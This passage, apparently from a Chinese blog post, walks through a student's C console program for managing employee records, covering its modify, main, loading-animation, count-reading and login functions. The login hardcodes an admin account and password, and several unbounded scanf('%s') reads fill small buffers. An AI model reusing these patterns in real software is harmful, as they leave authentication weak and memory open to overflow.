punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//关闭文件</span>    <span class="token keyword">char</span> ch<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//定义一个</span>    fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"wb+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"删除失败！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span>NUM<span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    FILE <span class="token operator">*</span>fp1<span class="token punctuation">;</span>    fp1<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"data.txt"</span><span class="token punctuation">,</span><span class="token string">"w+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//使用一个txt格式的文件作为辅助，进行数据量的计数。</span>    <span class="token function">itoa</span><span class="token punctuation">(</span>NUM<span class="token punctuation">,</span>ch<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//一个没学过的函数，把整形数转化成字符型；</span>    <span class="token function">fputs</span><span class="token punctuation">(</span>ch<span class="token punctuation">,</span>fp1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">f_5</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>workers<span class="token punctuation">)</span><span class="token comment">//在文件中读取数据，对数据进行修改，最后在存入文件中。</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>    <span class="token keyword">int</span> j<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">workers</span> read<span class="token punctuation">[</span>NUM<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> find<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fread</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span>NUM<span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入要修改的职工号"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>find<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span>NUM<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>jobNo<span class="token punctuation">,</span>find<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\n\n\t\t\t=============================================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||   1.修改员工号                   2.修改姓名             ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||   3.修改性别                     4.修改担任职务         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||   5.修改年龄                     6.修改员工工资         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||   7.修改员工家庭住址             8.修改员工联系方式     ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t=============================================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            p<span class="token operator">=</span>workers<span class="token punctuation">;</span>            <span class="token keyword">int</span> n<span class="token punctuation">;</span>            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">switch</span> <span class="token punctuation">(</span>n<span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>            <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入员工号:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>jobNo<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入姓名:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入性别:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>sex<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入所担任职务:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>position<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入年龄："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>year<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">6</span><span class="token operator">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入工资:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>salary<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">7</span><span class="token operator">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入家庭住址："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">8</span><span class="token operator">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入员工联系方式："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//以全部重新输入的形式去替换原本数据，达到修改的目的；</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"wb+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span>NUM<span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件修改失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"修改成功！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//最后返回操作界面；</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>####&nbsp;&nbsp;&nbsp;3.1.3main.c</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include&quot;gongshi.h&quot;int main()&#123;    smile() ;    struct workers *workers;    workers &#x3D; (struct workers*)malloc(sizeof(struct workers));    int flag_1;    int n;    flag_1&#x3D;sign();    see();    if(flag_1&#x3D;&#x3D;2)    &#123;        system(&quot;cls&quot;);        Hollow();        while (1)        &#123;            scanf(&quot;%d&quot;,&amp;n);            if(n&#x3D;&#x3D;1)                f_1(workers);            else if(n&#x3D;&#x3D;2)                f_2(workers);            else if(n&#x3D;&#x3D;3)            &#123;                int n;                system(&quot;cls&quot;);                printf(&quot;请输入查询方式             1.   员工号查询         2.姓名查询\n&quot;);                scanf(&quot;%d&quot;,&amp;n);                if (n&#x3D;&#x3D;1)f_3_1(workers);                else if (n&#x3D;&#x3D;2)f_3_2(workers);            &#125;            else if(n&#x3D;&#x3D;4)                f_4(workers);            else if(n&#x3D;&#x3D;5)                f_5(workers);            else if(n&#x3D;&#x3D;6)            &#123;                f_6(n);                break;            &#125;            else            &#123;                int n;                system(&quot;cls&quot;);                printf(&quot;请输入正确的功能编号!\n&quot;);                system(&quot;pause&quot;);                system(&quot;cls&quot;);                Hollow();            &#125;        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-2分函数讲解"><a href="#3-2分函数讲解" class="headerlink" title="3.2分函数讲解"></a>3.2分函数讲解</h4><h6 id="3-2-1登录过场动画"><a href="#3-2-1登录过场动画" class="headerlink" title="3.2.1登录过场动画"></a>3.2.1登录过场动画</h6><pre class="line-numbers language-none"><code class="language-none">void smile()&#x2F;&#x2F;1、系统加载界面&#123;    int i;    printf(&quot;\n\n\n\n&quot;);    printf(&quot;\t\t\t\t\t系统加载中\n&quot;);    printf(&quot;\t\t\t&quot;);    for(i &#x3D; 0; i &lt;20; i++)    &#123;        printf(&quot;$ &quot;);        if(i &#x3D;&#x3D;19)            printf(&quot;\n&quot;);        Sleep(100);        &#x2F;&#x2F;使计算机进入短暂的休眠状态100毫秒    &#125;    system(&quot;cls&quot;);    printf(&quot;\n\n\n\n&quot;);    printf(&quot;\t\t\t\t\t系统加载完成！\n&quot;);    printf(&quot;\t\t\t\t\t  欢迎使用！\n&quot;);    Sleep(500);    system(&quot;cls&quot;);&#x2F;&#x2F;执行清屏操作&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一个负责整活的过场动画，对于整个系统来说可有可无，但是可以丰富整个程序，避免这个程序过于简陋。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1 for循环和sleep（）函数搭配使用，每隔0.1秒输出一个$,做到登录动画；<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2 system(“cls”)函数清屏，输出系统加载完成，欢迎使用。</p><h6 id="3-2-2辅助文件读取函数（）"><a href="#3-2-2辅助文件读取函数（）" class="headerlink" title="3.2.2辅助文件读取函数（）"></a>3.2.2辅助文件读取函数（）</h6><pre class="line-numbers language-none"><code class="language-none">void see (void)&#x2F;&#x2F;该函数是从辅助文件中读取员工个数；&#123;    FILE *fp1;    char ch[10];    fp1&#x3D;fopen(&quot;data.txt&quot;,&quot;r+&quot;);    &#x2F;&#x2F;data.txt为辅助的文本文件；    if (fp1&#x3D;&#x3D;NULL)    &#123;        printf(&quot;人数预存文件打开失败&quot;);        exit(EXIT_FAILURE);    &#125;    fgets(ch,3,fp1);    NUM&#x3D;atoi(ch);    fclose(fp1);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1 我使用了名为<strong>data.txt</strong>的文本文件进行辅助，在运行这个文件时需要有一个函数读取文件中的数据。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2 使用fets（）函数以字符串的形式将数据从文本文件中读取出来，此时从文本文件中读取出来的是字符串，这里我们就用到一个atoi（）函数将字符串转化为整形数。</p><blockquote><p>其实这个地方用格式化读取<strong>fscanf（fp，“%d”，&amp;NUM）；</strong>完全可以做到，作者使用的方式完全多此一举，但考虑到实训要有和其他组不同的特色，故采取了这种下策，并不建议模仿。</p></blockquote><h6 id="3-2-3登录页面"><a href="#3-2-3登录页面" class="headerlink" title="3.2.3登录页面"></a>3.2.3登录页面</h6><pre class="line-numbers language-none"><code class="language-none">int sign(void)&#123;    int n;    struct workers *workers;    workers &#x3D; (struct workers*)malloc(sizeof(struct workers));    printf(&quot;\t\t\t&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;);    printf(&quot;\t\t\t||                  《职工信息管理系统》                   ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                 请按相应按键使用本系统！                ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||   1.员工登录                       2.管理员模式         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;);    scanf(&quot;%d&quot;,&amp;n);    char number[9];    char pow[10];    if(n&#x3D;&#x3D;2)    &#123;        printf(&quot;请输入管理员账号&quot;);        scanf(&quot;%s&quot;,number);        fflush(stdin);        printf(&quot;请输入密码&quot;);        &#123;            for(int i&#x3D;0; i&lt;9; i++)            &#123;                pow[i] &#x3D; getch();                &#x2F;*逐次赋值,但不回显*&#x2F;                if (pow[i] &#x3D;&#x3D; &#39;\x0d&#39;)                    &#x2F;*回车则终止循环*&#x2F;                &#123;                    pow[i]&#x3D;&#39;\0&#39;;                    break;                &#125;                printf(&quot;*&quot;);       &#x2F;*以星号代替字符个数*&#x2F;            &#125;            fflush(stdin);            if((strcmp(number,&quot;0001&quot;)&#x3D;&#x3D;0) &amp;&amp; (strcmp(pow,&quot;123456&quot;)&#x3D;&#x3D;0))            &#123;                return n;            &#125;            else                printf(&quot;账号或密码错误!&quot;);        &#125;    &#125;    else if(n&#x3D;&#x3D;1)    &#123;        f_3 (workers);        return n;    &#125;    else    &#123;        int n;        system(&quot;cls&quot;);        printf(&quot;请输入正确的功能编号!\n&quot;);        system(&quot;pause&quot;);        system(&quot;cls&quot;);        sign();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>此处是登录页面</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1 